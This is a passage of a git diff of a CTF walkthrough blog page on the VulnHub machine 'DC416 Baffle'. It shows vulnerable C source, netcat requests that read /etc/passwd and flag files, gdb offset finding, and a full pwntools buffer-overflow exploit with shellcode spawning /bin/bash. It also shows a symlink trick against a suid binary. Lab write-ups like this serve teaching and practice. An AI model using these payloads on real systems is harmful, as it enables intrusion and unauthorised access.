+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + 2;
+</span></span><span style="display:flex;"><span>    FiLe_len = n - 2 - 5 - 2;
+</span></span><span style="display:flex;"><span>    memcpy(file, ptr, file_len);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fp = fopen(file, &#34;r&#34;);
+</span></span><span style="display:flex;"><span>    if (fp) {
+</span></span><span style="display:flex;"><span>        memset(file_content, 0, sizeof(file_content));
+</span></span><span style="display:flex;"><span>        fgets(file_content, sizeof(file_content), fp);
+</span></span><span style="display:flex;"><span>        printf(&#34;%s&#34;, file_content);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int mAin(int arGc, char *argv[]) {
+</span></span><span style="display:flex;"><span>    char buf[2000];
+</span></span><span style="display:flex;"><span>    int n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    setbuf(stdout, 0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(buf, 0, sizeof(buf));
+</span></span><span style="display:flex;"><span>    n = read(0, buf, sizeof(buf));
+</span></span><span style="display:flex;"><span>    p{ARSE_REQUEST}(buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>9b5c226d15d611d6957f3fda7c993186270a6cc4</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>char to_write[500];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int parse_request(char *req, int n) {
+</span></span><span style="display:flex;"><span>    char data[500];
+</span></span><span style="display:flex;"><span>    char file[500];
+</span></span><span style="display:flex;"><span>    char file_content[500];
+</span></span><span style="display:flex;"><span>    int file_len;
+</span></span><span style="display:flex;"><span>    int req_type;
+</span></span><span style="display:flex;"><span>    char mode[10];
+</span></span><span style="display:flex;"><span>    char *ptr = req;
+</span></span><span style="display:flex;"><span>    FILE *fp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(file, 0, sizeof(file));
+</span></span><span style="display:flex;"><span>    memset(mode, 0, sizeof(mode));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(data, 0, sizeof(data));
+</span></span><span style="display:flex;"><span>    memset(to_write, 0, sizeof(to_write));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + 2;
+</span></span><span style="display:flex;"><span>    file_len = strlen(ptr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + file_len + 1;
+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + 6;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memcpy(to_write, ptr, 500);
+</span></span><span style="display:flex;"><span>    memcpy(data, ptr, 2000);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int main(int argc, char *argv[]) {
+</span></span><span style="display:flex;"><span>    char buf[2000];
+</span></span><span style="display:flex;"><span>    int n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    setbuf(stdout, 0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(buf, 0, sizeof(buf));
+</span></span><span style="display:flex;"><span>    n = read(0, buf, sizeof(buf));
+</span></span><span style="display:flex;"><span>    parse_request(buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>char to_write[500];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int parse_request(char *req, int n) {
+</span></span><span style="display:flex;"><span>    char data[500];
+</span></span><span style="display:flex;"><span>    char file[500];
+</span></span><span style="display:flex;"><span>    char file_content[500];
+</span></span><span style="display:flex;"><span>    int file_len;
+</span></span><span style="display:flex;"><span>    int req_type;
+</span></span><span style="display:flex;"><span>    char mode[10];
+</span></span><span style="display:flex;"><span>    char *ptr = req;
+</span></span><span style="display:flex;"><span>    FILE *fp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(file, 0, sizeof(file));
+</span></span><span style="display:flex;"><span>    memset(mode, 0, sizeof(mode));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(data, 0, sizeof(data));
+</span></span><span style="display:flex;"><span>    memset(to_write, 0, sizeof(to_write));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + 2;
+</span></span><span style="display:flex;"><span>    file_len = strlen(ptr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + file_len + 1;
+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + 6;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memcpy(to_write, ptr, 500);
+</span></span><span style="display:flex;"><span>    memcpy(data, ptr, 2000);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int main(int argc, char *argv[]) {
+</span></span><span style="display:flex;"><span>    char buf[2000];
+</span></span><span style="display:flex;"><span>    int n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    setbuf(stdout, 0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(buf, 0, sizeof(buf));
+</span></span><span style="display:flex;"><span>    n = read(0, buf, sizeof(buf));
+</span></span><span style="display:flex;"><span>    parse_request(buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>8bde72465957415c12ab6f89ff679f8f9e7c5c7a</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>char to_write[500];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int parse_request(char *req, int n) {
+</span></span><span style="display:flex;"><span>    char data[500];
+</span></span><span style="display:flex;"><span>    char file[500];
+</span></span><span style="display:flex;"><span>    char file_content[500];
+</span></span><span style="display:flex;"><span>    int file_len;
+</span></span><span style="display:flex;"><span>    int req_type;
+</span></span><span style="display:flex;"><span>    char mode[10];
+</span></span><span style="display:flex;"><span>    char *ptr = req;
+</span></span><span style="display:flex;"><span>    FILE *fp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    if (req_type == 0x01) {
+</span></span><span style="display:flex;"><span>        /* todo */
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    if (req_type == 0x2) {
+</span></span><span style="display:flex;"><span>        /* todo */
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int main(int argc, char *argv[]) {
+</span></span><span style="display:flex;"><span>    char buf[2000];
+</span></span><span style="display:flex;"><span>    int n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    setbuf(stdout, 0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(buf, 0, sizeof(buf));
+</span></span><span style="display:flex;"><span>    n = read(0, buf, sizeof(buf));
+</span></span><span style="display:flex;"><span>    parse_request(buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>By looking at the commit log using <code>git log -p</code> we can also see a file called <code>project.enc</code> which was deleted in later commits but more on this later.</p>
 <p>If we look closely on the file at commit <code>My cat danced on the keyboard</code> (<code>06483346fab91b2b17471074a887ac7dffd9ceda</code>) we can notice some uppercase letters. If we only extract the uppercase letters we get the following text:</p>
-<pre tabindex="0"><code>grep -ohE &#34;[A-Z]&#34; hellofriend.c | tr -d &#34;\n&#34;
-
-FILEFLAGARSEREQUEST
-</code></pre><p>So this looks like a flag string. Extracting it manually from the file reveals our first flag:</p>
-<pre tabindex="0"><code>FLAG{ARSE_REQUEST}
-</code></pre><p>The service running on port 6969 seems to be a merged version of the <code>hellofriend.c</code> revisions. The latest version of the code seems to check the <code>request type</code> of the received packet. Request code <code>0x01</code> calls the file read code and request code <code>0x02</code> the other one. Also the code always adds two to the char pointer before the filename is parsed so the request type has to be 2 bytes long.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>grep -ohE &#34;[A-Z]&#34; hellofriend.c | tr -d &#34;\n&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FILEFLAGARSEREQUEST
+</span></span></code></pre></div><p>So this looks like a flag string. Extracting it manually from the file reveals our first flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>FLAG{ARSE_REQUEST}
+</span></span></code></pre></div><p>The service running on port 6969 seems to be a merged version of the <code>hellofriend.c</code> revisions. The latest version of the code seems to check the <code>request type</code> of the received packet. Request code <code>0x01</code> calls the file read code and request code <code>0x02</code> the other one. Also the code always adds two to the char pointer before the filename is parsed so the request type has to be 2 bytes long.</p>
 <p>So let&rsquo;s have a look at the first code: the file read part.</p>
 <p>The file read code ignores the first two bytes(the request type) (<code>ptr = (char *)ptr + 2;</code>) and subtracts 9 from the string length to get the filename length (2 bytes request type + 6 bytes padding + NULL terminator). So all we have to do is send request code 0x01 and pad the filename with 6 random chars.</p>
-<pre tabindex="0"><code>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01/etc/passwdaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
-root:x:0:0:root:/root:/bin/bash
-</code></pre><p>As the <code>fgets</code> function only reads text up to a newline or EOF (null byte) character we are only able to read the first line of a file. This behaviour is enough to get the contents of <code>flag.txt</code>:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01flag.txtaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
-FLAG{is_there_an_ivana_tinkle}
-</code></pre><p>If we look at commit <strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong> we can see an additional file called <code>project.enc</code>. The file seems to be base64 encoded so let&rsquo;s decode it and have a look:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
-root@kali:~/baffle# cat project.enc | base64 -d &gt; exe
-root@kali:~/baffle/192.168.56.2# file exe
-exe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped
-</code></pre><p>So this looks like the compiled code and we can start analyzing it. By looking at the c code (because it&rsquo;s easier to read) we can see our vulnerable code at the bottom:</p>
-<pre tabindex="0"><code>memcpy(data, ptr, 2000);
-</code></pre><p>The <code>ptr</code> variable is modified before to cut of the header and then 2000 bytes are written to <code>data</code>. This copies way more bytes into <code>data</code> as it is able to hold (<code>char data[500];</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01/etc/passwdaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span></code></pre></div><p>As the <code>fgets</code> function only reads text up to a newline or EOF (null byte) character we are only able to read the first line of a file. This behaviour is enough to get the contents of <code>flag.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01flag.txtaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
+</span></span><span style="display:flex;"><span>FLAG{is_there_an_ivana_tinkle}
+</span></span></code></pre></div><p>If we look at commit <strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong> we can see an additional file called <code>project.enc</code>. The file seems to be base64 encoded so let&rsquo;s decode it and have a look:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+</span></span><span style="display:flex;"><span>root@kali:~/baffle# cat project.enc | base64 -d &gt; exe
+</span></span><span style="display:flex;"><span>root@kali:~/baffle/192.168.56.2# file exe
+</span></span><span style="display:flex;"><span>exe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped
+</span></span></code></pre></div><p>So this looks like the compiled code and we can start analyzing it. By looking at the c code (because it&rsquo;s easier to read) we can see our vulnerable code at the bottom:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>memcpy(data, ptr, 2000);
+</span></span></code></pre></div><p>The <code>ptr</code> variable is modified before to cut of the header and then 2000 bytes are written to <code>data</code>. This copies way more bytes into <code>data</code> as it is able to hold (<code>char data[500];</code>).</p>
 <p>As we have the binary we can load it in <code>gdb</code> and check if there are any protections in place</p>
-<pre tabindex="0"><code>gdb-peda$ checksec
-CANARY    : disabled
-FORTIFY   : disabled
-NX        : disabled
-PIE       : disabled
-RELRO     : disabled
-</code></pre><p>We can also check the ASLR status with the file read vulnerability:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01/proc/sys/kernel/randomize_va_spaceaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
-2
-</code></pre><p>So the only protection active is ASLR but the executable is compiled without PIE. At the disassembling we can see the code variable <code>to_write</code> is located at the fixed location <code>0x600de0</code>. As the memcpy executed before our vulnerability copies 500 bytes to this location we can plant our evil shellcode there and jump right to it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gdb-peda$ checksec
+</span></span><span style="display:flex;"><span>CANARY    : disabled
+</span></span><span style="display:flex;"><span>FORTIFY   : disabled
+</span></span><span style="display:flex;"><span>NX        : disabled
+</span></span><span style="display:flex;"><span>PIE       : disabled
+</span></span><span style="display:flex;"><span>RELRO     : disabled
+</span></span></code></pre></div><p>We can also check the ASLR status with the file read vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01/proc/sys/kernel/randomize_va_spaceaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
+</span></span><span style="display:flex;"><span>2
+</span></span></code></pre></div><p>So the only protection active is ASLR but the executable is compiled without PIE. At the disassembling we can see the code variable <code>to_write</code> is located at the fixed location <code>0x600de0</code>. As the memcpy executed before our vulnerability copies 500 bytes to this location we can plant our evil shellcode there and jump right to it.</p>
 <p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctftp_to_write.png" alt="binaryninja"></p>
 <p>To exploit the vulnerability we first need to be sure we reach the vulnerable <code>memcpy</code>. By looking at the <code>hellofriend.c</code> file we can identify the following conditions that must be met:</p>
 <ul>
@@ -495,137 +574,137 @@ RELRO     : disabled
 <li>After the 6 bytes we can plant our malicous code</li>
 </ul>
 <p>First we need to get the exact offset where we are able to control our return so let&rsquo;s create a pattern with a valid header:</p>
-<pre tabindex="0"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 &gt; pattern
-python -c &#39;print(&#34;\x02\x02asdf\x00aaaaaa&#34;)&#39; | tr -d &#34;\n&#34; &gt; test.txt
-cat pattern &gt;&gt; test.txt
-</code></pre><p>Then run it in gdb:</p>
-<pre tabindex="0"><code>r &lt; test.txt
-</code></pre><p>We can see the <code>ret</code> instruction would return to <code>8Ar9As0As1....</code> so we view the hex representation of the address <code>rsp</code> points to:</p>
-<pre tabindex="0"><code>gdb-peda$ x/1xg 0x7fffffffdc98
-0x7fffffffdc98:	0x4130734139724138
-</code></pre><p>We can now get the exact offset with <code>pattern_offset.rb</code> which is <code>536</code>:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x4130734139724138
-[*] Exact match at offset 536
-</code></pre><p>Now we have all info available to craft our exploit. When running the exploit the shellcode will be placed in the <code>to_write</code> variable and the return address is overwritten with the location of the variable and the shellcode is executed.</p>
-<pre tabindex="0"><code>root@kali:~/baffle# ./alice.py
-[*] Switching to interactive mode
-$ id
-uid=1001(alice) gid=1001(alice) groups=1001(alice)
-</code></pre><p>We are now dropped into <code>/</code> but we already have the <code>flag.txt</code> from this location.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 &gt; pattern
+</span></span><span style="display:flex;"><span>python -c &#39;print(&#34;\x02\x02asdf\x00aaaaaa&#34;)&#39; | tr -d &#34;\n&#34; &gt; test.txt
+</span></span><span style="display:flex;"><span>cat pattern &gt;&gt; test.txt
+</span></span></code></pre></div><p>Then run it in gdb:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>r &lt; test.txt
+</span></span></code></pre></div><p>We can see the <code>ret</code> instruction would return to <code>8Ar9As0As1....</code> so we view the hex representation of the address <code>rsp</code> points to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gdb-peda$ x/1xg 0x7fffffffdc98
+</span></span><span style="display:flex;"><span>0x7fffffffdc98: 0x4130734139724138
+</span></span></code></pre></div><p>We can now get the exact offset with <code>pattern_offset.rb</code> which is <code>536</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x4130734139724138
+</span></span><span style="display:flex;"><span>[*] Exact match at offset 536
+</span></span></code></pre></div><p>Now we have all info available to craft our exploit. When running the exploit the shellcode will be placed in the <code>to_write</code> variable and the return address is overwritten with the location of the variable and the shellcode is executed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# ./alice.py
+</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid=1001(alice) gid=1001(alice) groups=1001(alice)
+</span></span></code></pre></div><p>We are now dropped into <code>/</code> but we already have the <code>flag.txt</code> from this location.</p>
 <p>By looking at <code>/etc/passwd</code> we can see that there are 4 users present on the system</p>
-<pre tabindex="0"><code>vulnhub:x:1000:1000:vulnhub,,,:/home/vulnhub:/bin/bash
-alice:x:1001:1001:Alice,,,:/home/alice:/bin/bash
-bob:x:1002:1002:Bob,,,:/home/bob:/bin/bash
-charlie:x:1003:1003:,,,:/home/charlie:/bin/bash
-</code></pre><p>Code:</p>
-<pre tabindex="0"><code>#!/usr/bin/env python2
-
-from pwn import *
-
-context(bits=64,
-        os=&#34;linux&#34;,
-        aslr=False,
-        terminal=[&#34;tmux&#34;, &#34;splitw&#34;, &#34;-l&#34;, &#34;45&#34;])
-
-if len(sys.argv) &gt; 1:
-    local = True
-else:
-    local = False
-
-HOST = &#34;192.168.56.2&#34;
-PORT = 6969
-
-ADDR_TO_WRITE = 0x600de0
-OFFSET = 542
-
-def encode_payload(p):
-    return &#34;&#34;.join(&#34;\\x{:02x}&#34;.format(ord(c)) for c in p)
-
-# msfvenom -p linux/x64/exec -v shell -f py CMD=&#34;/bin/bash&#34;
-shell =  &#34;&#34;
-shell += &#34;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68&#34;
-shell += &#34;\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6&#34;
-shell += &#34;\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61&#34;
-shell += &#34;\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05&#34;
-
-header  = &#34;&#34;
-header += &#34;\x02\x02&#34;                   # request type
-header += &#34;A&#34; * 5                      # junk
-header += &#34;\x00&#34;                       # terminator
-header += &#34;B&#34; * 6                      # junk
-
-payload  = &#34;&#34;
-payload += shell                        # shell
-payload += &#34;\x90&#34; * (500-len(shell))    # shell padding
-payload += &#34;X&#34; * (536 - len(payload))   # offset to trigger the overflow
-payload += p64(ADDR_TO_WRITE)           # return address
-
-final_payload = header + payload
-
-try:
-    with context.quiet:
-        if local:
-            p = process(&#34;./ctftp&#34;)
-        else:
-            p = remote(HOST, PORT)
-    log.debug(&#34;Sending {}&#34;.format(encode_payload(final_payload)))
-    p.sendline(final_payload)
-    p.interactive()
-except EOFError as e:
-    log.error(e)
-finally:
-    with context.quiet:
-        p.close()
-</code></pre><h1 id="bob">bob</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>vulnhub:x:1000:1000:vulnhub,,,:/home/vulnhub:/bin/bash
+</span></span><span style="display:flex;"><span>alice:x:1001:1001:Alice,,,:/home/alice:/bin/bash
+</span></span><span style="display:flex;"><span>bob:x:1002:1002:Bob,,,:/home/bob:/bin/bash
+</span></span><span style="display:flex;"><span>charlie:x:1003:1003:,,,:/home/charlie:/bin/bash
+</span></span></code></pre></div><p>Code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#!/usr/bin/env python2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from pwn import *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context(bits=64,
+</span></span><span style="display:flex;"><span>        os=&#34;linux&#34;,
+</span></span><span style="display:flex;"><span>        aslr=False,
+</span></span><span style="display:flex;"><span>        terminal=[&#34;tmux&#34;, &#34;splitw&#34;, &#34;-l&#34;, &#34;45&#34;])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>if len(sys.argv) &gt; 1:
+</span></span><span style="display:flex;"><span>    local = True
+</span></span><span style="display:flex;"><span>else:
+</span></span><span style="display:flex;"><span>    local = False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST = &#34;192.168.56.2&#34;
+</span></span><span style="display:flex;"><span>PORT = 6969
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ADDR_TO_WRITE = 0x600de0
+</span></span><span style="display:flex;"><span>OFFSET = 542
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def encode_payload(p):
+</span></span><span style="display:flex;"><span>    return &#34;&#34;.join(&#34;\\x{:02x}&#34;.format(ord(c)) for c in p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># msfvenom -p linux/x64/exec -v shell -f py CMD=&#34;/bin/bash&#34;
+</span></span><span style="display:flex;"><span>shell =  &#34;&#34;
+</span></span><span style="display:flex;"><span>shell += &#34;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68&#34;
+</span></span><span style="display:flex;"><span>shell += &#34;\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6&#34;
+</span></span><span style="display:flex;"><span>shell += &#34;\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61&#34;
+</span></span><span style="display:flex;"><span>shell += &#34;\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>header  = &#34;&#34;
+</span></span><span style="display:flex;"><span>header += &#34;\x02\x02&#34;                   # request type
+</span></span><span style="display:flex;"><span>header += &#34;A&#34; * 5                      # junk
+</span></span><span style="display:flex;"><span>header += &#34;\x00&#34;                       # terminator
+</span></span><span style="display:flex;"><span>header += &#34;B&#34; * 6                      # junk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload  = &#34;&#34;
+</span></span><span style="display:flex;"><span>payload += shell                        # shell
+</span></span><span style="display:flex;"><span>payload += &#34;\x90&#34; * (500-len(shell))    # shell padding
+</span></span><span style="display:flex;"><span>payload += &#34;X&#34; * (536 - len(payload))   # offset to trigger the overflow
+</span></span><span style="display:flex;"><span>payload += p64(ADDR_TO_WRITE)           # return address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>final_payload = header + payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>try:
+</span></span><span style="display:flex;"><span>    with context.quiet:
+</span></span><span style="display:flex;"><span>        if local:
+</span></span><span style="display:flex;"><span>            p = process(&#34;./ctftp&#34;)
+</span></span><span style="display:flex;"><span>        else:
+</span></span><span style="display:flex;"><span>            p = remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>    log.debug(&#34;Sending {}&#34;.format(encode_payload(final_payload)))
+</span></span><span style="display:flex;"><span>    p.sendline(final_payload)
+</span></span><span style="display:flex;"><span>    p.interactive()
+</span></span><span style="display:flex;"><span>except EOFError as e:
+</span></span><span style="display:flex;"><span>    log.error(e)
+</span></span><span style="display:flex;"><span>finally:
+</span></span><span style="display:flex;"><span>    with context.quiet:
+</span></span><span style="display:flex;"><span>        p.close()
+</span></span></code></pre></div><h2 id="bob">bob<a href="#bob" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Another binary with the suid bit set (owned by <code>charlie</code>) can be found in <code>/home/bob/filez/flag_vault</code>. The directory also contains an unreadable <code>flag.txt</code> and <code>auth.txt</code>. The <code>flag_vault</code> binary contains a buffer overflow which I tried several hours to exploit but there is an easier way:</p>
 <p>We can copy the binary to a writeable location, create our own <code>auth.txt</code> and create a symlink to <code>flag.txt</code>. As the binary uses no absolute paths for the files we can trick it to use these two files and we are able to read the contents of the file and get the next flag.</p>
 <p><img src="/img/vulnhub_dc416_baffle/binaryninja_flag_vault.png" alt="binaryninja"></p>
-<pre tabindex="0"><code>cd /home/alice/
-echo test &gt; auth.txt
-ln -s /home/bob/filez/flag.txt /home/alice/flag.txt
-ln -s /home/bob/filez/flag_vault /home/alice/flag_vault
-</code></pre><pre tabindex="0"><code>$ ./flag_vault
-______ _                _    _   _             _ _
-|  ___| |            /\| |/\| | | |           | | |
-| |_  | | __ _  __ _ \ ` &#39; /| | | | __ _ _   _| | |_
-|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
